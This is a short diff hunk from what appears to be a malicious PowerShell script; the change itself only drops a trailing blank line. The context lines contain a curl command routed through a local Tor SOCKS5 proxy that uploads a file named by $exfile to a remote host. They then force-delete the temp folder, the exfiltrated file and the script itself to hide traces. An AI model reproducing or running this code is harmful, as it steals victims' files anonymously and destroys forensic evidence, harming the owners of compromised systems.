@@ -132,4 +132,3 @@ cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$r
 Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $exfile -Force
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-
